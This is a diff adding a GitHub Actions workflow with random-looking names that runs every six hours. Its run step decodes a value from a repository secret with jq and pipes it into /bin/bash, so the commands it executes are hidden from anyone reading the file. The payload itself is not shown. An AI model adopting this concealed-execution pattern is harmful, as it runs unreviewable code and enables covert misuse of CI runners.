@@ -1,0 +1,19 @@
+name: weibushuang5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weibushuang5678
+        env:
+          xl71: ${{ secrets.xl71 }}
+        run: |
+          echo $xl71 | jq -r .xtvmr42 | /bin/bash
+          echo $vabdu8751 | jq -r .nh3919 | /bin/bash
+          echo $vg06953 | jq -r .tkyt3881 | /bin/bash
+          echo $idyfr44664 | jq -r .sxgyv0 | /bin/bash
+
